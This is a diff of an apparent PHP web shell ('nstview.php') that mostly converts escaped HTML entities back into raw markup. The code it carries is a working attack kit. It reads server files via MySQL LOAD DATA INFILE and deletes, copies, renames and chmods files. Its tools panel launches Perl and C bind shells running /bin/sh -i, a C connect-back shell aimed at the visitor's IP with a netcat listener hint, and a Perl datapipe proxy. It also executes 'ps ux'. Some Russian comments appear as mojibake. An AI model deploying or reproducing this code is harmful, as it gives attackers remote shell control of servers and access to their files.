-mysql_create_db("tmp_bd_file") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-mysql_select_db("tmp_bd_file") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-mysql_query('CREATE TABLE `tmp_file` ( `file` LONGBLOB NOT NULL );') or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
+@mysql_connect($_POST['serv_ip'].":".$_POST['port'],$_POST['l'],$_POST['p']) or die("<font color=red>".mysql_error()."</font>");
+mysql_create_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
+mysql_select_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
+mysql_query('CREATE TABLE `tmp_file` ( `file` LONGBLOB NOT NULL );') or die("<font color=red>".mysql_error()."</font>");
 mysql_query("LOAD DATA INFILE \"".addslashes($read_file)."\" INTO TABLE tmp_file");
 $query = "SELECT * FROM tmp_file";
-$result = mysql_query($query) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-print "&lt;b&gt;File content&lt;/b&gt;:&lt;br&gt;&lt;br&gt;";
-for($i=0;$i&lt;mysql_num_fields($result);$i++){
+$result = mysql_query($query) or die("<font color=red>".mysql_error()."</font>");
+print "<b>File content</b>:<br><br>";
+for($i=0;$i<mysql_num_fields($result);$i++){
 $name=mysql_field_name($result,$i);}
 while($line=mysql_fetch_array($result, MYSQL_ASSOC)){
-foreach ($line as $key =&gt;$col_value) {
-print htmlspecialchars($col_value)."&lt;br&gt;";}}
+foreach ($line as $key =>$col_value) {
+print htmlspecialchars($col_value)."<br>";}}
 mysql_free_result($result);
-mysql_drop_db("tmp_bd_file") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
+mysql_drop_db("tmp_bd_file") or die("<font color=red>".mysql_error()."</font>");
 }
 
 
@@ -1093,14 +1093,14 @@ $ccopy_to=$_GET['ccopy_to'];
 # delete
 if(@$_GET['del_f']){
 if(!isset($delete)){
-print "&lt;font color=red&gt;Delete this file?&lt;/font&gt;&lt;br&gt;
-&lt;b&gt;$d/$wich_f&lt;br&gt;&lt;br&gt;&lt;/b&gt;
-&lt;a href='$php_self?d=$d&del_f=$wich_f&delete=1'&gt;Yes&lt;/a&gt; / &lt;a href='$php_self?d=$d'&gt;No&lt;/a&gt;
+print "<font color=red>Delete this file?</font><br>
+<b>$d/$wich_f<br><br></b>
+<a href='$php_self?d=$d&del_f=$wich_f&delete=1'>Yes</a> / <a href='$php_self?d=$d'>No</a>
 ";}
 if($delete==1){
 unlink($d."/".$del_f);
-print "&lt;b&gt;File: &lt;font color=green&gt;$d/$del_f DELETED!&lt;/font&gt;&lt;/b&gt;
-&lt;br&gt;&lt;b&gt; &lt;a href='$php_self?d=$d'&gt;# BACK&lt;/a&gt;
+print "<b>File: <font color=green>$d/$del_f DELETED!</font></b>
+<br><b> <a href='$php_self?d=$d'># BACK</a>
 ";
 }
 echo $copyr;
@@ -1112,18 +1112,18 @@ exit;
 if($ccopy_to){
 $wich_f=$_POST['wich_f'];
 $to_f=$_POST['to_f'];
-print "&lt;font color=green&gt;Copy file:&lt;br&gt;
-$d/$ccopy_to&lt;/font&gt;&lt;br&gt;
-&lt;br&gt;
-&lt;form method=post&gt;
-File:&lt;br&gt;&lt;input name=wich_f size=100 value='$d/$ccopy_to'&gt;&lt;br&gt;&lt;br&gt;
-To:&lt;br&gt;&lt;input name=to_f size=100 value='$d/nst_$ccopy_to'&gt;&lt;br&gt;&lt;br&gt;
-&lt;input type=submit value=Copy&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;
+print "<font color=green>Copy file:<br>
+$d/$ccopy_to</font><br>
+<br>
+<form method=post>
+File:<br><input name=wich_f size=100 value='$d/$ccopy_to'><br><br>
+To:<br><input name=to_f size=100 value='$d/nst_$ccopy_to'><br><br>
+<input type=submit value=Copy></form><br><br>
 ";
 
 if($to_f){
-@copy($wich_f,$to_f) or die("&lt;font color=red&gt;Cannot copy!!! maybe folder is not writable&lt;/font&gt;");
-print "&lt;font color=green&gt;&lt;b&gt;Copy success!!!&lt;/b&gt;&lt;/font&gt;&lt;br&gt;";
+@copy($wich_f,$to_f) or die("<font color=red>Cannot copy!!! maybe folder is not writable</font>");
+print "<font color=green><b>Copy success!!!</b></font><br>";
 }
 
 echo $copyr;
@@ -1134,15 +1134,15 @@ exit;
 # chmod
 if(@$_GET['chmod']){
 $perms = @fileperms($d."/".$wich_f);
-print "&lt;b&gt;&lt;font color=green&gt;CHMOD file $d/$wich_f&lt;/font&gt;&lt;br&gt;
-&lt;br&gt;&lt;center&gt;This file chmod is&lt;/b&gt; ";
+print "<b><font color=green>CHMOD file $d/$wich_f</font><br>
+<br><center>This file chmod is</b> ";
 print perm($perms);
-print "&lt;/center&gt;
-&lt;br&gt;";
-$chmd=&lt;&lt;&lt;HTML
+print "</center>
+<br>";
+$chmd=<<<HTML
 
-&lt;script&gt;
-&lt;!--
+<script>
+<!--
 
 function do_chmod(user) {
         var field4 = user + "4";
@@ -1180,62 +1180,62 @@ function do_chmod(user) {
         document.chmod.t_total.value = document.chmod.t_owner.value + document.chmod.t_group.value + document.chmod.t_other.value;
         document.chmod.sym_total.value = "-" + document.chmod.sym_owner.value + document.chmod.sym_group.value + document.chmod.sym_other.value;
 }
-//--&gt;
-&lt;/script&gt;
+//-->
+</script>
 
 
 
-&lt;form name="chmod" method=post&gt;
-&lt;p&gt;&lt;table cellpadding="0" cellspacing="0" border="0" bgcolor="silver"&gt;&lt;tr&gt;&lt;td width="100%" valign="top"&gt;&lt;table width="100%" cellpadding="5" cellspacing="2" border="0"&gt;&lt;tr&gt;&lt;td width="100%" bgcolor="#008000" align="center" colspan="5"&gt;&lt;font color="#ffffff" size="3"&gt;&lt;b&gt;CHMOD (File Permissions)&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;
-        &lt;tr bgcolor="gray"&gt;
-                &lt;td align="left"&gt;&lt;b&gt;Permission&lt;/b&gt;&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;b&gt;Owner&lt;/b&gt;&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;b&gt;Group&lt;/b&gt;&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;b&gt;Other&lt;/b&gt;&lt;/td&gt;
-                &lt;td bgcolor="#dddddd" rowspan="4"&gt; &lt;/td&gt;
-        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
-                &lt;td align="left" nowrap&gt;&lt;b&gt;Read&lt;/b&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="owner4" value="4" onclick="do_chmod('owner')"&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="group4" value="4" onclick="do_chmod('group')"&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="other4" value="4" onclick="do_chmod('other')"&gt;&lt;/td&gt;
-        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
-                &lt;td align="left" nowrap&gt;&lt;b&gt;Write&lt;/b&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="owner2" value="2" onclick="do_chmod('owner')"&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="group2" value="2" onclick="do_chmod('group')"&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="other2" value="2" onclick="do_chmod('other')"&gt;&lt;/td&gt;
-        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
-                &lt;td align="left" nowrap&gt;&lt;b&gt;Execute&lt;/b&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="owner1" value="1" onclick="do_chmod('owner')"&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="group1" value="1" onclick="do_chmod('group')"&gt;&lt;/td&gt;
-                &lt;td align="center" bgcolor="#ffffff"&gt;&lt;input type="checkbox" name="other1" value="1" onclick="do_chmod('other')"&gt;&lt;/td&gt;
-        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
-                &lt;td align="right" nowrap&gt;Octal:&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;input type="text" name="t_owner" value="" size="1"&gt;&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;input type="text" name="t_group" value="" size="1"&gt;&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;input type="text" name="t_other" value="" size="1"&gt;&lt;/td&gt;
-                &lt;td align="left"&gt;&lt;b&gt;=&lt;/b&gt; &lt;input type="text" name="t_total" value="777" size="3"&gt;&lt;/td&gt;
-        &lt;/tr&gt;&lt;tr bgcolor="#dddddd"&gt;
-                &lt;td align="right" nowrap&gt;Symbolic:&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;input type="text" name="sym_owner" value="" size="3"&gt;&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;input type="text" name="sym_group" value="" size="3"&gt;&lt;/td&gt;
-                &lt;td align="center"&gt;&lt;input type="text" name="sym_other" value="" size="3"&gt;&lt;/td&gt;
-                &lt;td align="left" width=100&gt;&lt;b&gt;=&lt;/b&gt; &lt;input type="text" name="sym_total" value="" size="10"&gt;&lt;/td&gt;
-        &lt;/tr&gt;
-&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;
+<form name="chmod" method=post>
+<p><table cellpadding="0" cellspacing="0" border="0" bgcolor="silver"><tr><td width="100%" valign="top"><table width="100%" cellpadding="5" cellspacing="2" border="0"><tr><td width="100%" bgcolor="#008000" align="center" colspan="5"><font color="#ffffff" size="3"><b>CHMOD (File Permissions)</b></font></td></tr>
+        <tr bgcolor="gray">
+                <td align="left"><b>Permission</b></td>
+                <td align="center"><b>Owner</b></td>
+                <td align="center"><b>Group</b></td>
+                <td align="center"><b>Other</b></td>
+                <td bgcolor="#dddddd" rowspan="4"> </td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="left" nowrap><b>Read</b></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner4" value="4" onclick="do_chmod('owner')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group4" value="4" onclick="do_chmod('group')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other4" value="4" onclick="do_chmod('other')"></td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="left" nowrap><b>Write</b></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner2" value="2" onclick="do_chmod('owner')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group2" value="2" onclick="do_chmod('group')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other2" value="2" onclick="do_chmod('other')"></td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="left" nowrap><b>Execute</b></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="owner1" value="1" onclick="do_chmod('owner')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="group1" value="1" onclick="do_chmod('group')"></td>
+                <td align="center" bgcolor="#ffffff"><input type="checkbox" name="other1" value="1" onclick="do_chmod('other')"></td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="right" nowrap>Octal:</td>
+                <td align="center"><input type="text" name="t_owner" value="" size="1"></td>
+                <td align="center"><input type="text" name="t_group" value="" size="1"></td>
+                <td align="center"><input type="text" name="t_other" value="" size="1"></td>
+                <td align="left"><b>=</b> <input type="text" name="t_total" value="777" size="3"></td>
+        </tr><tr bgcolor="#dddddd">
+                <td align="right" nowrap>Symbolic:</td>
+                <td align="center"><input type="text" name="sym_owner" value="" size="3"></td>
+                <td align="center"><input type="text" name="sym_group" value="" size="3"></td>
+                <td align="center"><input type="text" name="sym_other" value="" size="3"></td>
+                <td align="left" width=100><b>=</b> <input type="text" name="sym_total" value="" size="10"></td>
+        </tr>
+</table></td></tr></table></p>
 HTML;
 
-print "&lt;center&gt;".$chmd."
+print "<center>".$chmd."
 
-&lt;b&gt;$d/$wich_f&lt;/b&gt;&lt;br&gt;&lt;br&gt;
-&lt;input type=submit value=CHMOD&gt;&lt;/form&gt;
-&lt;/center&gt;
-&lt;/form&gt;
+<b>$d/$wich_f</b><br><br>
+<input type=submit value=CHMOD></form>
+</center>
+</form>
 ";
 $t_total=$_POST['t_total'];
 if($t_total){
 chmod($d."/".$wich_f,$t_total);
-print "&lt;center&gt;&lt;font color=green&gt;&lt;br&gt;&lt;b&gt;Now chmod is $t_total&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;/font&gt;";
-print "&lt;a href='$php_self?d=$d'&gt;# BACK&lt;/a&gt;&lt;br&gt;&lt;br&gt;";
+print "<center><font color=green><br><b>Now chmod is $t_total</b><br><br></font>";
+print "<a href='$php_self?d=$d'># BACK</a><br><br>";
 }
 echo $copyr;
 exit;
@@ -1243,13 +1243,13 @@ exit;
 
 # rename
 if(@$_GET['rename']){
-print "&lt;b&gt;&lt;font color=green&gt;RENAME $d/$wich_f ?&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&lt;br&gt;
-&lt;center&gt;
-&lt;form method=post&gt;
-&lt;b&gt;RENAME&lt;/b&gt;&lt;br&gt;&lt;u&gt;$wich_f&lt;/u&gt;&lt;br&gt;&lt;Br&gt;&lt;B&gt;TO&lt;/B&gt;&lt;br&gt;
-&lt;input name=rto size=40 value='$wich_f'&gt;&lt;br&gt;&lt;br&gt;
-&lt;input type=submit value=RENAME&gt;
-&lt;/form&gt;
+print "<b><font color=green>RENAME $d/$wich_f ?</b></font><br><br>
+<center>
+<form method=post>
+<b>RENAME</b><br><u>$wich_f</u><br><Br><B>TO</B><br>
+<input name=rto size=40 value='$wich_f'><br><br>
+<input type=submit value=RENAME>
+</form>
 ";
 
 @$rto=$_POST['rto'];
@@ -1261,9 +1261,9 @@ $to1=$d."/".$rto;
 $to1=str_replace("//","/",$to1);
 
 rename($fr1,$to1);
-print "File &lt;br&gt;&lt;b&gt;$wich_f&lt;/b&gt;&lt;br&gt;Renamed to &lt;b&gt;$rto&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
+print "File <br><b>$wich_f</b><br>Renamed to <b>$rto</b><br><br>";
 
-echo "&lt;meta http-equiv=\"REFRESH\" content=\"3;URL=".$php_self."?d=".$d."&rename=1&wich_f=".$rto."\"&gt;";
+echo "<meta http-equiv=\"REFRESH\" content=\"3;URL=".$php_self."?d=".$d."&rename=1&wich_f=".$rto."\">";
 
 }
 
@@ -1297,10 +1297,10 @@ deldir($dir);
 $rback=$_GET['rback'];
 @$rback=explode("/",$rback);
 $crb=count($rback);
-for($i=0; $i&lt;$crb-1; $i++){
+for($i=0; $i<$crb-1; $i++){
         @$x.=$rback[$i]."/";
 }
-echo "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL='$php_self?d=".@$x."'\"&gt;";
+echo "<meta http-equiv=\"REFRESH\" content=\"0;URL='$php_self?d=".@$x."'\">";
 echo $copyr;
 exit;}
 
@@ -1309,19 +1309,19 @@ if(@$_GET['t']=="tools"){
         # unix
 if($os=="unix"){
 print "
-&lt;center&gt;&lt;br&gt;
-&lt;font color=red&gt;&lt;b&gt;P.S: After you Start, your browser may stuck! You must close it, and then run nstview.php again.&lt;/b&gt;&lt;br&gt;&lt;/font&gt;
-&lt;table border=1&gt;
-&lt;tr&gt;&lt;td align=center&gt;&lt;b&gt;[Name]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[C]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Port]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Perl]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Port]&lt;/td&gt;&lt;td align=center&gt;&lt;b&gt;[Other options, info]&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Backdoor:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=c_bd value='Start' style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5545&gt;&lt;/td&gt;&lt;/form&gt;&lt;form method=post&gt;&lt;td&gt;&lt;input type=submit name=perl_bd value='Start' style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port value=5551 size=6&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Back connect:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' name=bc_c style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_c size=6 value=5546&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' name=port_p disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port value=5552 size=6&gt;&lt;/td&gt;&lt;td&gt;b.c. ip: &lt;input name=ip value='".$_SERVER['REMOTE_ADDR']."'&gt; nc -l -p &lt;i&gt;5546&lt;/i&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Datapipe:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_1 size=6 value=5547&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' name=datapipe_pl style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port_2 value=5553 size=6&gt;&lt;/td&gt;&lt;td&gt;other serv ip: &lt;input name=ip&gt; port: &lt;input name=port_3 value=5051 size=6&gt;&lt;/td&gt;&lt;/form&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Web proxy:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5548&gt;&lt;/td&gt;&lt;/form&gt;&lt;form method=post&gt;&lt;td&gt;&lt;input type=submit value='Start' name=perl_proxy style='background-color:green;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5554&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Socks 4 serv:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5549&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5555&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Socks 5 serv:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5550&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;&lt;input type=submit value='Start' disabled style='background-color:gray;'&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5556&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;
-&lt;/table&gt;
-&lt;/center&gt;
-&lt;br&gt;&lt;Br&gt;
+<center><br>
+<font color=red><b>P.S: After you Start, your browser may stuck! You must close it, and then run nstview.php again.</b><br></font>
+<table border=1>
+<tr><td align=center><b>[Name]</td><td align=center><b>[C]</td><td align=center><b>[Port]</td><td align=center><b>[Perl]</td><td align=center><b>[Port]</td><td align=center><b>[Other options, info]</td></tr>
+<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input type=submit name=c_bd value='Start' style='background-color:green;'></td><td><input name=port size=6 value=5545></td></form><form method=post><td><input type=submit name=perl_bd value='Start' style='background-color:green;'></td><td><input name=port value=5551 size=6></td><td>none</td></form></tr>
+<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><input type=submit value='Start' name=bc_c style='background-color:green;'></td><td><input name=port_c size=6 value=5546></td><td><input type=submit value='Start' name=port_p disabled style='background-color:gray;'></td><td><input name=port value=5552 size=6></td><td>b.c. ip: <input name=ip value='".$_SERVER['REMOTE_ADDR']."'> nc -l -p <i>5546</i></td></form></tr>
+<tr><form method=post><td><font color=red><b>Datapipe:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port_1 size=6 value=5547></td><td><input type=submit value='Start' name=datapipe_pl style='background-color:green;'></td><td><input name=port_2 value=5553 size=6></td><td>other serv ip: <input name=ip> port: <input name=port_3 value=5051 size=6></td></form></tr>
+<tr><form method=post><td><font color=red><b>Web proxy:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5548></td></form><form method=post><td><input type=submit value='Start' name=perl_proxy style='background-color:green;'></td><td><input name=port size=6 value=5554></td></form><td>none</td></tr>
+<tr><form method=post><td><font color=red><b>Socks 4 serv:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5549></td></form><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5555></td><td>none</td></tr>
+<tr><form method=post><td><font color=red><b>Socks 5 serv:</b></font></td><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5550></td></form><td><input type=submit value='Start' disabled style='background-color:gray;'></td><td><input name=port size=6 value=5556></td><td>none</td></tr>
+</table>
+</center>
+<br><Br>
 ";
 }#end of unix
 
@@ -1332,7 +1332,7 @@ $perl_bd_scp = "
 use Socket;\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
 setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(\$p,INADDR_ANY));
 listen(S,50);while(1){accept(X,S);if(!(\$pid=fork)){if(!defined \$pid){exit(0);}
-open STDIN,\"&lt;&X\";open STDOUT,\"&gt;&X\";open STDERR,\"&gt;&X\";exec(\"/bin/sh -i\");
+open STDIN,\"<&X\";open STDOUT,\">&X\";open STDERR,\">&X\";exec(\"/bin/sh -i\");
 close X;}}";
 
 if(is_writable("/tmp")){
@@ -1378,11 +1378,11 @@ $show_ps="1";
 if($_POST['c_bd']){
 $port=$_POST['port'];
 $c_bd_scp = "#define PORT $port
-#include &lt;stdio.h&gt;
-#include &lt;signal.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-#include &lt;netinet/in.h&gt;
+#include <stdio.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 
 int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
 struct sockaddr_in serv_addr;
@@ -1412,7 +1412,7 @@ int main ()
     while (1) {
         soc_len = sizeof(client_addr);
         soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
-        if (soc_cli &lt; 0)
+        if (soc_cli < 0)
             exit(0);
         cli_pid = getpid();
         server_pid = fork();
@@ -1457,14 +1457,14 @@ $show_ps="1";
 if($_POST['bc_c']){ # nc -l -p 4500
 $port_c = $_POST['port_c'];
 $ip=$_POST['ip'];
-$bc_c_scp = "#include &lt;stdio.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;sys/socket.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;fcntl.h&gt;
+$bc_c_scp = "#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <fcntl.h>
 
-#include &lt;netinet/in.h&gt;
-#include &lt;netdb.h&gt;
+#include <netinet/in.h>
+#include <netdb.h>
 
 int fd, sock;
 int port = $port_c;
@@ -1474,8 +1474,8 @@ char mesg[]  = \"::Connect-Back Backdoor:: CMD: \";
 char shell[] = \"/bin/sh\";
 
 int main(int argc, char *argv[]) {
-        while(argc&lt;2) {
-        fprintf(stderr, \" %s &lt;ip&gt; \", argv[0]);
+        while(argc<2) {
+        fprintf(stderr, \" %s <ip> \", argv[0]);
         exit(0); }
 
 addr.sin_family = AF_INET;
@@ -1561,28 +1561,28 @@ if (\$daemon){
         POSIX::setsid() or die \"Can't start a new session: \$!\";
 }
 
-%o = ('port' =&gt; \$localport,
-          'toport' =&gt; \$port,
-          'tohost' =&gt; \$host);
+%o = ('port' => \$localport,
+          'toport' => \$port,
+          'tohost' => \$host);
 
-\$ah = IO::Socket::INET-&gt;new(
-                         'LocalPort' =&gt; \$localport,
-                         'Reuse' =&gt; 1,
-                         'Listen' =&gt; 10)
+\$ah = IO::Socket::INET->new(
+                         'LocalPort' => \$localport,
+                         'Reuse' => 1,
+                         'Listen' => 10)
     || die \"Íåëüçÿ îòêðûòü ñîêåò äëÿ ñîåäèíåíèé: \$!\";
 
 print \"Íà÷èíàåì âûïîëíåíèÿ öèêëà.\n\" if \$log;
 \$SIG{'CHLD'} = 'IGNORE';
 \$num = 0;
 while (1) {
-        \$ch = \$ah-&gt;accept();
+        \$ch = \$ah->accept();
         if (!\$ch) {
                 print STDERR \"Ïðåðâàíî âûïîëåíèå accept: \$!\n\";
                 next;
         }
 
         printf(\"Íîâûé êëèåíò: host %s, port %s.\n\",
-        \$ch-&gt;peerhost(), \$ch-&gt;peerport()) if \$log;
+        \$ch->peerhost(), \$ch->peerport()) if \$log;
         ++\$num;
         \$pid = fork();
         if (!defined(\$pid)) {
@@ -1590,35 +1590,35 @@ while (1) {
     } elsif (\$pid == 0) {
 
 ### Íîâûé ïðîöåññ
-                \$ah-&gt;close();
+                \$ah->close();
                 Run(\%o, \$ch, \$num);
         } else {
                 print \"Parent: Fork ïðîøåë óñïåøíî, çàêðûâàåì ñîêåò.\n\" if \$log;
-                \$ch-&gt;close();
+                \$ch->close();
         }
 }
 
 
 sub Run {
         my(\$o, \$ch, \$num) = @_;
-        my \$th = IO::Socket::INET-&gt;new('PeerAddr' =&gt; \$o-&gt;{'tohost'},
-                                                        'PeerPort' =&gt; \$o-&gt;{'toport'});
-        print(\"Child: Äåëàåì ðåäèðåêò íà \$o-&gt;{'tohost'}, ïîðò \$o-&gt;{'toport'}.\n\") if \$log;
+        my \$th = IO::Socket::INET->new('PeerAddr' => \$o->{'tohost'},
+                                                        'PeerPort' => \$o->{'toport'});
+        print(\"Child: Äåëàåì ðåäèðåêò íà \$o->{'tohost'}, ïîðò \$o->{'toport'}.\n\") if \$log;
         if (!\$th) {
                 printf STDERR (\"Child: Ïðåðâàí ðåäèðåêò íà %s, ïîðò %s.\n\",
-                \$o-&gt;{'tohost'}, \$o-&gt;{'toport'});
+                \$o->{'tohost'}, \$o->{'toport'});
                 exit 0;
         }
 
         my \$fh;
-        if (\$o-&gt;{'dir'}) {
+        if (\$o->{'dir'}) {
                 \$fh = Symbol::gensym();
-                open(\$fh, \"&gt;\$o-&gt;{'dir'}/tunnel\$num.log\")
-                or die \"Child: Ïðåðâàíî ñîçäàíèå ëîã ôàéëà \$o-&gt;{'dir'}/tunnel\$num.log: \$!\";
+                open(\$fh, \">\$o->{'dir'}/tunnel\$num.log\")
+                or die \"Child: Ïðåðâàíî ñîçäàíèå ëîã ôàéëà \$o->{'dir'}/tunnel\$num.log: \$!\";
         }
 
-        \$ch-&gt;autoflush();
-        \$th-&gt;autoflush();
+        \$ch->autoflush();
+        \$th->autoflush();
         while (\$ch || \$th) {
                 print \"Child: Âêëþ÷àåì öèêë.\n\" if \$log;
                 my \$rin = \"\";
@@ -1671,7 +1671,7 @@ sub Run {
                         print \"Child: Îòïðàâëÿåì \$len áàéò.\n\" if \$log;
                         my \$res = syswrite(\$th, \$tbuffer, \$len);
                         print \"Child: Äàííûå îòïðàâëåíû.\n\" if \$log;
-                        if (\$res &gt; 0) {
+                        if (\$res > 0) {
                                 \$tbuffer = substr(\$tbuffer, \$res);
                         } else {
                                 print STDERR \"Child: Íåâîçìîæíî îòïðàâèòü äàííûå: \$!\n\";
@@ -1682,7 +1682,7 @@ sub Run {
                         print \"Child: Îòïðàâëÿåì \$len áàéò êëèåíòó.\n\" if \$log;
                         my \$res = syswrite(\$ch, \$cbuffer, \$len);
                         print \"Child: Äàííûå îòïðàâëåíû..\n\" if \$log;
-                        if (\$res &gt; 0) {
+                        if (\$res > 0) {
                                 \$cbuffer = substr(\$cbuffer, \$res);
                         } else {
                                 print STDERR \"Child: Íåâîçìîæíî îòïðàâèòü äàííûå: \$!\n\";
@@ -1717,44 +1717,44 @@ $show_ps="1";
 
 
 if($show_ps=="1"){
-print "&lt;center&gt;&lt;b&gt;1&lt;/b&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;";
-print "&lt;pre&gt;";
+print "<center><b>1</b></center><br><br>";
+print "<pre>";
 passthru("ps ux");
-print "&lt;/pre&gt;&lt;br&gt;&lt;br&gt;";
+print "</pre><br><br>";
 }
 
 
 
